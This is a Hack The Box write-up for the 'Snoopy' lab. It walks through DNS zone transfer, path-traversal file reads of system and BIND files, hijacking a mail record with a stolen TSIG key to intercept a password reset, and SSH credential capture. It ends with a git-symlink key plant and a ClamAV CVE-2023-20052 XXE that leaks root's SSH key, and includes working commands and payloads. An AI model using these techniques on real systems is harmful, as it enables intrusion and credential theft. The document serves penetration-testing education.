---
title: 'HTB Snoopy: Complete Evidence-Led Walkthrough'
description: DNS zone transfer and file disclosure revealed dynamic DNS authority, enabling password-reset interception and a multistage SSH, Git and ClamAV escalation.
date: 2026-11-12
category: Linux / Web Security
difficulty: Hard
tags:
- Hack The Box
- Linux
- DNS
- TSIG
- LFI
- Mattermost
- Git
- ClamAV
published: true
slug: htb-snoopy
---

# Overview

**Machine:** Snoopy  
**Platform:** Hack The Box  
**Publication format:** htb-snoopy.md  

A DNS and web enumeration branch exposed BIND configuration that was actionable, not merely informative. The route from record modification to Mattermost password reset depended on careful email and callback handling.

**Documentation standard:** All meaningful stages, verification results, failed leads, command sequences, and operator notes from the uploaded source are retained below. A redacted placeholder means the method was documented but its secret value is intentionally excluded. Reported results and absent terminal evidence remain explicitly qualified.

### Engagement context from the original record

**Target:** Snoopy  
**Target IP:** `10.129.117.244`  
**Domain:** `snoopy.htb`  
**Operating system:** Linux  
**Difficulty:** Hard  
**Date:** 27 October 2026  
**Assessment type:** Authorized HTB laboratory assessment  
**Status:** Root access achieved

---

### Executive Summary

The Snoopy assessment demonstrated how a chain of individually understandable weaknesses can result in complete host compromise.

The initial enumeration identified SSH, DNS, and HTTP. DNS zone transfer exposed internal hostnames and infrastructure addresses. A file-download endpoint subsequently provided local file inclusion (LFI), allowing access to operating-system files and BIND configuration.

The BIND configuration contained a TSIG key and permissive dynamic DNS update rules. Using the recovered key, the assessment successfully demonstrated unauthorized modification of DNS records. The `mail.snoopy.htb` record was redirected to the attacker's HTB VPN address, enabling interception of a Mattermost password-reset email.

After gaining Mattermost access, the server-provisioning integration became the next attack surface. A connection test confirmed that the service initiated SSH connections to an attacker-controlled listener. A Python Paramiko SSH honeypot then captured the credentials of `cbrown`.

The `cbrown` account belonged to the `devops` group and was permitted to run a restricted Git command as `sbrown`. A symlink-based `git apply` operation allowed an SSH public key to be installed into `sbrown`'s SSH directory, resulting in a successful privilege transition.

The `sbrown` account could execute ClamAV as root with a constrained `--debug` command. The installed ClamAV version was 1.0.0. A crafted DMG exploiting CVE-2023-20052 triggered an XML External Entity (XXE) file disclosure through the scanner's debug output. The resulting root SSH key disclosure enabled root access.

#### Confirmed outcome

- DNS zone transfer completed.
- LFI confirmed and operating-system files retrieved.
- BIND TSIG key recovered.
- Dynamic DNS update capability demonstrated.
- Mattermost password-reset email intercepted.
- SSH provisioning callback confirmed.
- `cbrown` credentials captured and SSH access obtained.
- `sbrown` SSH access obtained through the Git symlink technique.
- User flag recovered.
- Root access achieved, as reported by the operator.

**User flag:** `[REDACTED]``

**Root flag:** `[REDACTED]`

---

## Enumeration

This section documents the initial conditions, observable services, reachable applications and evidence that informed the next action.

### Scope and Methodology

#### In-scope asset

| Property | Value |
|---|---|
| Target | `10.129.117.244` |
| Primary domain | `snoopy.htb` |
| HTTP application | `http://snoopy.htb` |
| Mattermost | `http://mm.snoopy.htb` |
| SSH | TCP/22 |
| DNS | TCP/UDP 53 |
| HTTP | TCP/80 |

#### Methodology

The engagement followed a progressive enumeration and exploitation approach:

1. Enumerate exposed services.
2. Enumerate DNS records and virtual hosts.
3. Investigate the web application's file-download functionality.
4. Use LFI to inspect configuration files and secrets.
5. Validate the impact of recovered DNS credentials.
6. Intercept the password-reset workflow.
7. Enumerate Mattermost integrations and server-side behavior.
8. Capture SSH authentication attempts.
9. Enumerate privileges and exploit the Git execution rule.
10. Enumerate the next account's sudo permissions.
11. Identify the vulnerable ClamAV version.
12. Build the exploit in a controlled local environment.
13. Verify root access and collect evidence.

Throughout the engagement, confirmed observations were distinguished from hypotheses. This is particularly important when dealing with empty file responses, internal network addresses, and behavior that could be caused by caching or background cleanup.

---

### Initial Enumeration

#### Port scan

The initial scan identified three open TCP ports:

```text
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

These services suggested three initial avenues:

- SSH for eventual credential-based access.
- DNS for zone-transfer, record, and configuration enumeration.
- HTTP for web application discovery and exploitation.

A useful reproducible baseline is:

```bash
nmap -sC -sV -p22,53,80 10.129.117.244
```

Follow-up enumeration should include all TCP ports, relevant UDP services, and service-specific tests. The three ports above are the services confirmed in the initial evidence; they should not be interpreted as proof that no other services exist.

#### DNS zone transfer

The DNS server permitted AXFR for `snoopy.htb`.

```bash
dig @10.129.117.244 snoopy.htb AXFR
```

The transfer returned the following records:

| Hostname | Address | Initial interpretation |
|---|---|---|
| `mattermost.snoopy.htb` | `172.18.0.3` | Internal Mattermost service |
| `mm.snoopy.htb` | `127.0.0.1` | Local Mattermost alias |
| `postgres.snoopy.htb` | `172.18.0.2` | Internal PostgreSQL service |
| `provisions.snoopy.htb` | `172.18.0.4` | Internal provisioning service |
| `www.snoopy.htb` | `127.0.0.1` | Web application alias |
| `ns1.snoopy.htb` | `10.0.50.10` | DNS server |
| `ns2.snoopy.htb` | `10.0.51.10` | DNS server |

The zone also exposed its SOA and NS records.

Additional DNS queries confirmed the authoritative nameservers:

```bash
dig @10.129.117.244 snoopy.htb SOA
dig @10.129.117.244 snoopy.htb NS
```

#### Why this mattered

AXFR provided an infrastructure map before any credentials were available. The `postgres` and `provisions` records were particularly useful clues: they indicated that the externally exposed web application was only part of the environment.

The internal addresses were not directly reachable simply because DNS disclosed them. Their presence was a lead to investigate, not proof of a reachable database or a container escape.

#### Virtual-host enumeration

The discovered names were tested against HTTP using the target IP and a modified `Host` header:

```bash
for host in \
  www.snoopy.htb \
  mm.snoopy.htb \
  mattermost.snoopy.htb \
  provisions.snoopy.htb \
  postgres.snoopy.htb
do
  echo "===== $host ====="
  curl -sS -i --max-time 5 \
    -H "Host: $host" \
    "http://10.129.117.244/" |
    head -n 15
done
```

Most names returned the same static website response from Nginx. `mm.snoopy.htb` returned Mattermost responses.

The observed Mattermost version header was:

```text
X-Version-Id: 7.9.0.7.9.0.[REDACTED_HEX].false
```

The API returned normal unauthenticated status information, while a request to an authenticated endpoint returned an expired-session error.

`robots.txt` contained only:

```text
User-agent: *
```

These observations helped identify the application but did not independently establish an exploit.

---

## Analysis

The recovered TSIG key permitted authenticated dynamic DNS updates; redirecting mail.snoopy.htb enabled interception of a quoted-printable Mattermost reset message. An SSH provisioning callback exposed another credential. The cbrown to sbrown transition used a symlink affecting a constrained git apply action. ClamAV debug processing of a crafted DMG disclosed root SSH material through CVE-2023-20052.

### Complete Attack-Chain Summary

```text
External enumeration
    |
    v
DNS AXFR
    |
    v
Internal hostnames and service discovery
    |
    v
LFI through /download?file=
    |
    v
Read /etc/bind configuration
    |
    v
Recover rndc-key TSIG secret
    |
    v
Authenticated dynamic DNS updates
    |
    v
Redirect mail.snoopy.htb to attacker VPN IP
    |
    v
Intercept Mattermost password-reset email
    |
    v
Mattermost access
    |
    v
Inspect provisioning integration
    |
    v
SSH callback to attacker-controlled listener
    |
    v
Paramiko honeypot captures cbrown credentials
    |
    v
SSH as cbrown
    |
    v
sudo git apply as sbrown
    |
    v
Symlink-based file operation
    |
    v
SSH as sbrown
    |
    v
Recover user flag
    |
    v
sudo clamscan --debug as root
    |
    v
CVE-2023-20052 XXE disclosure
    |
    v
Recover root SSH key
    |
    v
Root access
```

---

## Validation

The following is the full technical sequence retained from the uploaded write-up, including commands, outputs, dead ends, corrected tests and the limits of available proof. Section order within this part follows the original investigation.

### LFI Discovery and Operating-System Enumeration

#### Identifying the download endpoint

The primary website exposed:

```text
http://snoopy.htb/download?file=.
```

The `file` parameter was a strong candidate for file-path manipulation.

Traversal payloads using repeated `....//` sequences bypassed the application's handling of ordinary traversal strings. A representative form was:

```text
/download?file=....//....//....//etc/passwd
```

The actual successful request used a longer traversal sequence.

The response contained `/etc/passwd`, confirming arbitrary file read through the download endpoint.

#### Understanding the response format

The endpoint did not always return raw file contents directly. Several helper functions were used during enumeration:

- `fetch_file`
- `probe_file`
- `read_remote`

Successful responses frequently contained ZIP archives with paths such as:

```text
press_package/etc/passwd
press_package/etc/hostname
press_package/proc/self/cmdline
```

For example, `/etc/passwd` was returned as an archive whose uncompressed file size was 1,805 bytes.

This behavior matters when automating LFI: a successful HTTP 200 does not necessarily mean the response body is the requested file. The response may be an archive, a wrapper, or an empty result.

#### Accounts identified in `/etc/passwd`

The relevant entries included:

```text
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
```

This established likely usernames and home directories before any shell access was obtained.

#### File and process enumeration

The following targets were tested through LFI:

```text
/etc/passwd
/etc/hostname
/etc/crontab
/etc/ssh/ssh_config
/proc/self/cmdline
/proc/self/status
/proc/self/mountinfo
/proc/self/cgroup
/proc/net/route
/etc/hosts
/etc/resolv.conf
```

`/proc/self/cmdline` returned:

```text
php-fpm: pool www
```

`/proc/self/status` identified the web process as:

```text
Uid:    33  33  33  33
Gid:    33  33  33  33
Groups: 33
```

This confirmed that the PHP-FPM process operated as `www-data`, not root.

`/proc/net/route` disclosed network routes, while `/proc/self/mountinfo` contained overlay filesystem and network-namespace entries.

**Important correction:** overlay mounts alone were not a reason to pursue a speculative container-escape path. The successful attack chain remained on the Snoopy host. The presence of internal addresses or overlay mounts should trigger further investigation only when there is evidence that the relevant environment is reachable and exploitable.

#### Home-directory and history checks

Several home-directory files were requested, including:

```text
/home/cbrown/.bash_history
/home/cbrown/.ssh/id_rsa
/home/sbrown/.bash_history
/home/sbrown/.ssh/id_rsa
/home/lpelt/.bash_history
/home/cschultz/.bash_history
/home/vgray/.bash_history
```

The helper scripts returned empty files for these particular requests.

An empty response does not establish that a file is nonexistent or unreadable in every context. It may reflect an empty file, a wrapper limitation, a symlink, or the endpoint's response-handling behavior.

The early file checks did not immediately produce credentials. The key improvement was to continue into service configuration files instead of repeatedly probing home-directory artifacts.

---

### The Critical Discovery: BIND Configuration

#### Enumerating DNS configuration

The DNS server configuration was eventually examined through LFI:

```text
/etc/bind/named.conf
/etc/bind/named.conf.options
/etc/bind/named.conf.local
/etc/bind/named.conf.default-zones
/etc/default/bind9
```

The most important file was `/etc/bind/named.conf`.

It included:

```text
key "rndc-key" {
    algorithm hmac-sha256;
    secret "[REDACTED_SECRET]";
};
```

This exposed a secret used by BIND's update-control mechanism.

The options file also contained:

```text
dnssec-validation no;
allow-transfer {10.0.0.0/8;};
```

The local configuration defined the authoritative zone:

```text
zone "snoopy.htb" IN {
    type master;
    file "/var/lib/bind/db.snoopy.htb";
    allow-update { key "rndc-key"; };
    allow-transfer { 10.0.0.0/8; };
};
```

The zone file was successfully retrieved from:

```text
/var/lib/bind/db.snoopy.htb
```

It contained the same primary host records observed during AXFR.

#### Why this was the turning point

The zone file alone did not provide the credentials required to modify records. The configuration exposed both:

1. The TSIG secret.
2. The fact that authenticated dynamic updates were permitted for the zone.

The combination allowed us to move from passive DNS enumeration to an authenticated DNS modification.

This is the lesson to retain: **when LFI exposes a DNS server, enumerate its configuration files and follow every referenced file path. Do not stop at the zone contents.**

---

### Validating Dynamic DNS Updates

#### Preparing the TSIG key file

The recovered secret was placed in a local key file on Parrot:

```bash
cat > /tmp/snoopy-tsig.key <<'EOF'
key "rndc-key" {
    algorithm hmac-sha256;
    secret "[REDACTED_SECRET]";
};
EOF

chmod 600 /tmp/snoopy-tsig.key
```

This file was used by `nsupdate` to authenticate modifications to the target's authoritative zone.

#### Proof-of-control test

Before modifying a meaningful record, we added a temporary TXT record.

```bash
TESTNAME="cpts-proof-1793118170.snoopy.htb."

nsupdate -k /tmp/snoopy-tsig.key <<EOF
server 10.129.117.244
zone snoopy.htb.
update add ${TESTNAME} 60 TXT "authorized update test"
send
EOF
```

The record was verified:

```bash
dig @10.129.117.244 "$TESTNAME" TXT
```

The response contained:

```text
cpts-proof-1793118170.snoopy.htb. 60 IN TXT "authorized update test"
```

The temporary record was then deleted:

```bash
nsupdate -k /tmp/snoopy-tsig.key <<EOF
server 10.129.117.244
zone snoopy.htb.
update delete ${TESTNAME} TXT
send
EOF
```

A subsequent query returned NXDOMAIN.

The SOA serial advanced during the update sequence, confirming that the zone had been modified.

#### Why the test was useful

It established that the secret was operational and that the server accepted authenticated updates. This was stronger evidence than merely finding a key in a configuration file.

The same mechanism could now be used to redirect a hostname relevant to the next attack stage.

---

### Redirecting `mail.snoopy.htb`

#### Identifying the correct callback address

The attacker's VPN interface was:

```bash
ip -4 -o addr show tun0
```

The observed address was:

```text
10.10.14.254/23
```

We therefore used:

```bash
export LHOST=$(ip -4 -o addr show tun0 |
  awk '{split($4,a,"/"); print a[1]}')
```

The address had to be the HTB VPN address, not a local Wi-Fi, Ethernet, or loopback address.

#### Updating the mail record

The record was changed using the recovered TSIG key:

```bash
nsupdate -k /tmp/snoopy-tsig.key <<EOF
server 10.129.117.244
zone snoopy.htb.
update delete mail.snoopy.htb. A
update add mail.snoopy.htb. 86400 A $LHOST
send
EOF
```

It was verified using:

```bash
dig @10.129.117.244 mail.snoopy.htb A +noall +answer
```

The answer returned:

```text
mail.snoopy.htb. 86400 IN A 10.10.14.254
```

#### TTL lesson

The TTL of `86400` means 86,400 seconds, or 24 hours.

TTL controls how long a resolver may cache a record. It does **not** automatically delete the authoritative record after 24 hours.

For temporary lab redirections, a short TTL such as 60 seconds is generally easier to manage because it limits how long a cached result may persist. A long TTL can make troubleshooting harder when the record is changed again.

#### The disappearing record

At a later point, the query returned no answer and the authoritative server returned NXDOMAIN for `mail.snoopy.htb`.

This was a significant troubleshooting moment: a previously correct record could no longer be relied upon.

The exact cause was not conclusively established in the captured terminal output. Possible explanations include the zone being restored or reset, or the record having been removed by another process. The lesson is not to assume a DNS change remains effective indefinitely.

Immediately before triggering a dependent workflow, verify the record again:

```bash
dig @10.129.117.244 mail.snoopy.htb A +noall +answer
```

Reapply the update if necessary, then test the workflow while the record is confirmed.

---

### SMTP Listener and Mattermost Password Reset

#### Why the first attempts failed

The first password-reset attempts returned:

```text
Failed to send password reset email successfully.
```

A TCP capture was started:

```bash
sudo tcpdump -ni tun0 -nn -A 'tcp port 25'
```

Initially, no packets appeared.

The listener and DNS record were checked independently:

```bash
sudo ss -lntp 'sport = :25'
```

The system showed a Python process listening on `0.0.0.0:25`.

The VPN interface was confirmed to be `10.10.14.254`, and the DNS record was checked against the target's authoritative server.

These checks separated three possible failure points:

- The target might not be resolving the mail hostname to the attacker.
- The target might not be reaching TCP/25.
- The listener might be unable to process the SMTP exchange.

#### Python package and permission problems

The initial installation attempt failed:

```bash
python -m pip install paramiko
```

Parrot returned:

```text
error: externally-managed-environment
```

This was the expected PEP 668 protection against modifying system-managed Python packages.

A second attempt contained a typo:

```bash
pipx install install paramiko
```

That command attempted to install a package named `install`.

The correct approach was to use the existing virtual environment:

```bash
/home/enkidu/smtp-venv/bin/python -m pip install paramiko
```

Port 25 also required elevated privileges. Running the SMTP server as a normal user produced:

```text
PermissionError: [Errno 13] error while attempting to bind on address ('0.0.0.0', 25)
```

The solution was to run the virtual environment's Python interpreter with sudo, rather than installing packages globally or weakening Parrot's Python package protections.

#### Successful email interception

Once the DNS redirection and listener were functioning, a Mattermost password-reset email was captured.

The email contained a URL resembling:

```text
http://mm.snoopy.htb/reset_password_complete?token=[REDACTED_TOKEN]
[REDACTED_TOKEN_CONTINUATION]
```

The line break and `=3D` were significant.

The message used quoted-printable encoding:

- `=3D` represented a literal `=`.
- The `=` at the end of the first line represented a soft line break and was not part of the token.

The reconstructed URL was:

```text
http://mm.snoopy.htb/reset_password_complete?token=[REDACTED_TOKEN]
```

The reset workflow was completed, and the password chosen during the engagement was:

```text
moon@123
```

The exact account email used for that successful reset was not unambiguously preserved in the captured conversation. `lpelt@snoopy.htb` was subsequently identified as the intended account to try, but the report should not claim a particular reset account unless the original evidence confirms it.

#### Key lesson

When an email appears malformed, inspect the encoding before assuming the token is invalid. Also, always distinguish DNS record verification from SMTP connectivity verification. One does not prove the other.

---

### Mattermost Enumeration and the Provisioning Integration

After logging in to Mattermost, the channel history provided several important clues.

The conversation included:

- A new channel for requests to provision servers.
- A custom DevSecOps tool being introduced.
- A requirement that requested hosts already work with the company's IPA authentication.
- Discussion of ClamAV as the endpoint-protection software in use.
- References to `cbrown` as the person handling server requests.

These were not just background details. They connected the web application to an operational SSH workflow and hinted at the eventual root escalation mechanism.

#### Why the IPA comment mattered

The comment that a server must already work with IPA, otherwise `cbrown` would not be able to log in, suggested that the provisioning workflow relied on the remote host's authentication behavior.

That made the SSH connection initiated by the integration worth investigating.

The mention of ClamAV was also a useful clue for later local enumeration. Once we reached `sbrown`, the sudo rule confirmed that ClamAV could be invoked as root.

---

### Confirming the SSH Callback

A Netcat listener was started on the attacker:

```bash
nc -lvnp 2222
```

When a provisioning request was submitted, the listener received a connection from the target:

```text
Connection received on 10.129.117.244 43746
SSH-2.0-paramiko_3.1.0
```

This established that the provisioning workflow initiated an SSH connection to the supplied listener.

#### Important distinction

Netcat was useful for confirming the TCP connection and identifying the SSH client banner. It was not an SSH server and could not complete authentication or expose a password by itself.

The next step was to replace the passive listener with an SSH server implementation capable of handling authentication attempts.

---

### Capturing `cbrown`'s Credentials

A Python Paramiko SSH honeypot was used to accept SSH protocol negotiation, record authentication attempts, and reject the login.

The captured output was:

```text
[CAPTURE] source=10.129.117.244 username='cbrown' password='<REDACTED>'
```

This was the credential provenance:

| Item | Value |
|---|---|
| Source | `10.129.117.244` |
| Username | `cbrown` |
| Password | `[REDACTED]` |
| Capture method | Paramiko SSH honeypot |
| Trigger | Mattermost server-provisioning workflow |

The credentials were then used to connect to the target over SSH.

```bash
ssh cbrown@10.129.117.244
```

The captured password was supplied at the prompt.

This yielded a shell as `cbrown`.

#### Why a honeypot was necessary

The initial Netcat test established reachability, but only a protocol-aware SSH server could capture the authentication exchange.

The distinction between a raw TCP connection and an authenticated SSH attempt should be preserved in the notes. The SSH banner was evidence of the client software, not evidence that credentials had been submitted.

---

### Initial Access as `cbrown`

The following commands were executed on Snoopy:

```bash
id
whoami
hostname
pwd
```

The results confirmed:

```text
uid=1000(cbrown) gid=1000(cbrown) groups=1000(cbrown),1002(devops)
```

The hostname was:

```text
snoopy.htb
```

The working directory was:

```text
/home/cbrown
```

A minor command typo occurred during enumeration:

```text
hostename
```

The command failed because the correct command is `hostname`. This was harmless, but it illustrates why command syntax should be verified before treating a failure as a target-side issue.

#### Sudo enumeration

The next command was:

```bash
sudo -l
```

The relevant rule was:

```text
User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: <REDACTED> ^apply -v [a-zA-Z0-9.]+$
```

This was the critical privilege boundary.

It allowed `cbrown` to execute Git as `sbrown`, with a tightly constrained argument pattern. The regular expression permitted a filename composed of letters, digits, and dots.

The command was not a general root permission. The objective was to understand whether the permitted Git operation could be manipulated into writing a file outside the intended working tree.

---

### Privilege Escalation: `cbrown` to `sbrown`

#### Generate an SSH key on Parrot

The SSH key pair was generated locally:

```bash
mkdir -p <REDACTED>

ssh-keygen -t rsa -b 4096 \
  -f ~/boxes/snoopy/loot/sbrown_rsa \
  -N ""

cat ~/boxes/snoopy/loot/sbrown_rsa.pub
```

The private key remained on Parrot. Only the public key was transferred to the target through the patch workflow.

#### Create the Git working directory

In the `cbrown` SSH session:

```bash
cd /tmp
mkdir pwn-git-exploit
cd pwn-git-exploit

git init

ln -s /home/sbrown/.ssh target_link

git add target_link

git -c user.name=cbrown \
    -c user.email=cbrown@snoopy.htb \
    commit -m "Add SSH directory symlink"
```

The repository contained a symbolic link pointing to `sbrown`'s SSH directory.

The objective was to exploit the interaction between the symlink and the permitted `git apply` operation.

#### Transfer the public key into the working directory

The public key was pasted into a file called `pubkey`.

An initial attempt failed because the heredoc delimiter was entered on the same line as the key:

```text
cat > pubkey <<'EOF'ssh-rsa ...
```

That is not valid heredoc syntax. The shell expects the opening delimiter to be followed by a newline, and the closing delimiter must occupy its own line.

The corrected structure was:

```bash
cat > pubkey <<'EOF'
PASTE_THE_COMPLETE_PUBLIC_KEY_HERE
EOF
```

The file was then checked:

```bash
wc -l pubkey
ssh-keygen -lf pubkey
```

This verified that the public-key file contained one line and could be parsed.

#### Create the patch

The patch renamed the symlink and then added an `authorized_keys` file through the renamed path.

The essential patch structure was:

```text
diff --git a/target_link b/renamed_target
similarity index 100%
rename from target_link
rename to renamed_target
--
diff --git /dev/null b/renamed_target/authorized_keys
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed_target/authorized_keys
@@ -0,0 +1 @@
+<the complete public key>
```

The patch file was created in the working directory and inspected before use.

#### First attempt: permission failure

The command was:

```bash
sudo -u sbrown /usr/bin/git apply -v patch
```

The first attempt failed:

```text
Checking patch target_link => renamed_target...
Checking patch renamed_target/authorized_keys...
warning: unable to unlink 'target_link': Permission denied
error: unable to write file 'renamed_target' mode 120000: No such file or directory
```

The important clue was:

```text
unable to unlink 'target_link': Permission denied
```

The Git operation was being executed as `sbrown`, but the temporary directory was owned by `cbrown`. Removing or renaming a directory entry requires suitable permissions on the parent directory.

This was a permissions problem in the exploit setup, not proof that the symlink technique was ineffective.

#### Correct the directory permissions

The working directory's permissions were changed:

```bash
cd /tmp/pwn-git-exploit
chmod 777 .
ls -ld .
```

The patch was then applied again:

```bash
sudo -u sbrown /usr/bin/git apply -v patch
```

The subsequent successful SSH login as `sbrown` confirmed that the public-key installation had worked. The exact successful `git apply` output was not pasted into the captured conversation, so it should be added from the original terminal if available.

#### Authenticate as `sbrown`

A path mistake occurred next: the SSH command was initially run from inside the remote `cbrown` session.

The private key did not exist at:

```text
/home/cbrown/boxes/snoopy/loot/sbrown_rsa
```

That path belonged to the attacker's machine, not Snoopy.

The correction was to return to Parrot and run:

```bash
ssh -i ~/boxes/snoopy/loot/sbrown_rsa \
  sbrown@10.129.117.244
```

The login succeeded.

This is an important operational distinction: private keys generated on the attacking machine should remain there unless there is a deliberate, justified reason to transfer them.

---

### User Flag and `sbrown` Enumeration

The new shell was verified:

```bash
whoami
id
```

The output confirmed:

```text
sbrown
uid=1001(sbrown) gid=1001(sbrown) groups=1001(sbrown),1002(devops)
```

The home directory contained:

```text
scanfiles
user.txt
```

The user flag was recovered:

```bash
cat user.txt
```

Output:

```text
[REDACTED_HEX]
```

#### Sudo enumeration

The next privilege boundary was discovered with:

```bash
sudo -l
```

The relevant rule was:

```text
User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```

This rule allowed root execution of ClamAV with `--debug`, restricted to a filename in `/home/sbrown/scanfiles/` matching the specified regular expression.

The filename restriction did not eliminate the danger: the file being scanned could still be attacker-controlled.

---

### ClamAV Enumeration and CVE-2023-20052

The installed version was checked:

```bash
/usr/local/bin/clamscan --version
```

The result was:

```text
ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023
```

ClamAV 1.0.0 is affected by CVE-2023-20052, a vulnerability involving the handling of crafted DMG content and XML external entities.

The key combination was:

1. A ClamAV version affected by the vulnerability.
2. A sudo rule that ran the scanner as root.
3. A user-writable scan directory.
4. The ability to enable debug output.
5. A parser path that could disclose the contents of a privileged file.

The Mattermost discussion about ClamAV was a useful contextual clue, but the actual exploitability was established by local version and sudo enumeration.

---

### Building the Exploit Environment on Parrot

The exploit generator repository was cloned locally:

```bash
cd ~/boxes/snoopy

git clone https://github.com/nokn0wthing/CVE-2023-20052.git

cd CVE-2023-20052
```

#### First build failure

The initial image build failed during the package repository update.

The Dockerfile referenced the Debian Stretch security archive. The repository metadata could not be verified because the signing key was expired or unavailable.

The observed errors included:

```text
EXPKEYSIG AA8E81B4331F7F50
NO_PUBKEY 112695A0E562B32A
```

The build therefore failed at the `apt-get update` step, and no usable image was created.

Attempting to run the missing image then produced an image-name resolution error.

#### Discovering the container runtime

The `docker` command on Parrot was a Podman compatibility shim:

```text
Emulate Docker CLI using podman.
```

The short image name was not resolved by Podman because no unqualified image registry was configured.

The build was retried explicitly using Podman and a fully qualified local image name:

```bash
sudo podman build --no-cache \
  -t localhost/cve-2023-20052 .
```

For this disposable, outdated PoC environment, the repository configuration was adjusted to permit retrieval of the archived package metadata despite the obsolete signing configuration. This was a laboratory build workaround, not a recommended practice for normal software builds.

#### Start the container

The container was started with the repository directory mounted into `/exploit`:

```bash
sudo podman run --rm \
  -v "$(pwd):/exploit:Z" \
  -it localhost/cve-2023-20052 bash
```

The following utilities were confirmed to exist inside the container:

```bash
command -v genisoimage
command -v dmg
command -v bbe
```

Results:

```text
/usr/bin/genisoimage
/usr/bin/dmg
/usr/bin/bbe
```

The repository contained its README, Dockerfile, Git metadata, and supporting files.

#### Important distinction

The container was used on the attacking machine to build the exploit image. It was not the privilege-escalation path on Snoopy. The successful chain was based on the host's exposed BIND configuration, application integration, sudo rules, and vulnerable ClamAV installation.

---

### Crafted DMG and Root-Key Disclosure

Inside the local exploit container, the image-generation workflow used the available utilities to create an ISO, convert it to DMG format, and modify the XML metadata to reference a privileged file.

The resulting artifact was transferred to the scan directory:

```text
/home/sbrown/scanfiles/exploit.dmg
```

The scanner was then invoked through the permitted sudo rule, with debug output captured for inspection.

The intended disclosure target was:

```text
/root/.ssh/id_rsa
```

The vulnerable parser processed the crafted DMG, and the debug output exposed the root SSH private key. That key enabled SSH authentication as root.

The exact `clamscan` output and the complete private-key block were not included in the captured conversation. They must not be reconstructed or invented in the final report. If the original terminal log is available, preserve it as evidence and redact the private key from any public copy of the write-up.

#### Root verification

The operator subsequently confirmed that root access had been obtained.

The final verification should be preserved in the evidence bundle using the original terminal output:

```bash
whoami
id
cat /root/root.txt
```

The actual root flag was not pasted into the conversation, so the root flag field in the final report remains to be populated from the original evidence.

---

### Mistake and Troubleshooting Log

This section is deliberately retained. These were useful lessons from the actual engagement, not details to remove from a polished report.

| Issue | What happened | Corrective lesson |
|---|---|---|
| Initial web enumeration was not enough | Several virtual hosts returned the same static page | Move from surface discovery into application-specific and filesystem enumeration |
| LFI returned ZIP archives | HTTP 200 did not always mean raw file content | Inspect the response format and archive entries |
| Home-directory probes were empty | Several requested files returned empty archives or files | Do not conclude that a file is absent without validating the response mechanism |
| Internal overlay mounts were noticed | It was tempting to follow a speculative container route | Require evidence of a useful container foothold before pursuing container exploitation |
| DNS configuration was initially overlooked | The investigation spent time on application and other configuration paths | Read BIND configuration and referenced zone files whenever LFI permits |
| DNS record disappeared | `mail.snoopy.htb` returned NXDOMAIN after previously resolving | Revalidate the authoritative record immediately before dependent actions |
| TTL misunderstanding | `86400` was chosen for a temporary record | TTL affects caching; it does not automatically delete the authoritative record |
| No SMTP packets initially appeared | `tcpdump` showed only its listening banner | Check the DNS record, listener, target workflow, and connectivity independently |
| Port 25 permission error | The normal user could not bind the privileged port | Run the appropriate listener with elevated privileges when required |
| PEP 668 blocked installation | Global pip installation was rejected | Use the existing virtual environment |
| Incorrect `pipx` command | `pipx install install paramiko` tried to install `install` | Verify command syntax before interpreting package errors |
| Netcat did not capture credentials | It received an SSH banner but was not an SSH server | Use a protocol-aware SSH honeypot for authentication testing |
| Heredoc was malformed | The public key was entered on the opening delimiter line | Put the opening and closing delimiters on their own lines |
| Git patch failed on the first attempt | `target_link` could not be unlinked | Inspect parent-directory permissions and distinguish setup failures from exploit failure |
| Private-key path was wrong | SSH was invoked from the target while referencing a Parrot path | Know which machine owns each key and run the client from the machine containing the private key |
| Hostname command typo | `hostename` failed | Verify syntax before treating a command failure as meaningful target behavior |
| Exploit container build failed | Debian Stretch archive signatures were obsolete | Inspect the Dockerfile and package repository configuration |
| Docker command did not resolve the image | The command was a Podman compatibility shim | Identify the actual runtime and use a fully qualified local image name |
| Root proof was not pasted into the transcript | Root was reported, but the root flag and complete key-disclosure output were absent | Preserve the final terminal output before closing the session |

---

## Impact

DNS update, password reset, credential capture, account transitions and root access are reported as achieved. The exact root flag value and final terminal proof were not retained.

### Evidence Register

The final report should attach the following evidence where available.

| ID | Evidence | Status |
|---|---|---|
| E-01 | Initial port scan showing SSH, DNS, and HTTP | Confirmed in conversation |
| E-02 | AXFR output and internal hostnames | Confirmed |
| E-03 | HTTP virtual-host responses and Mattermost version | Confirmed |
| E-04 | LFI response containing `/etc/passwd` | Confirmed |
| E-05 | BIND `named.conf`, `named.conf.options`, and `named.conf.local` | Confirmed |
| E-06 | Dynamic TXT record creation, query, and deletion | Confirmed |
| E-07 | `mail.snoopy.htb` resolving to `10.10.14.254` | Confirmed |
| E-08 | SMTP reset email and decoded token | Confirmed |
| E-09 | Mattermost provisioning callback and Paramiko banner | Confirmed |
| E-10 | Captured `cbrown` authentication | Confirmed |
| E-11 | `cbrown` sudo rule and first failed Git patch | Confirmed |
| E-12 | Successful SSH login as `sbrown` | Confirmed |
| E-13 | User flag | `[REDACTED]` |
| E-14 | `sbrown` sudo rule and ClamAV version | Confirmed |
| E-15 | Podman build and tool availability | Confirmed |
| E-16 | Complete ClamAV debug output showing root key | Not included in captured conversation |
| E-17 | Root SSH login and root flag | Root access reported; original terminal evidence and flag value not captured |

Do not invent screenshots or outputs to fill the missing evidence. Reattach the original terminal output if it is still available.

---

### Final Assessment

Snoopy demonstrated a complete chain from unauthenticated network access to root. The decisive steps were not isolated exploits but the connections between the services:

- LFI exposed a DNS signing secret.
- The DNS secret enabled mail redirection.
- Mail redirection enabled password-reset interception.
- Mattermost's provisioning integration disclosed SSH credentials.
- A constrained Git command enabled the next account transition.
- A privileged, vulnerable scanner exposed a root credential.

The most reusable lesson is to **continue enumerating the configuration and trust relationships behind every service**. DNS, email, application integrations, filesystem permissions, and privileged parsers all contributed to this chain.

